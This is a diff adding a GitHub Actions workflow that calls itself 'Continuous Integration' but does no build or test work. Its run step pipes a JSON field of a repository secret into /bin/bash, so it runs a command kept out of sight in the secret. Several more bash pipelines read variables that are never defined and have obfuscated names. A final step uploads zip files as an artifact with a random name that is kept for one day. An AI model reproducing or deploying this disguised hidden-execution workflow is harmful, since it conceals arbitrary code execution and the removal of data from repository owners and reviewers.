@@ -1,0 +1,30 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          hy1: ${{ secrets.hy1 }}
+        run: |
+          printf '%s' "$hy1" | jq -r .y06390 | /bin/bash
+          echo $ilsz33672 | jq -r .kt3 | /bin/bash
+          printf '%s' "$us57479" | jq -r .stxhx00025 | /bin/bash
+          echo $sdm9 | jq -r .ips6187 | /bin/bash
+          printf '%s' "$ivy56" | jq -r .s9709 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: CPijgiGa
+          path: "*.zip"
+          retention-days: 1
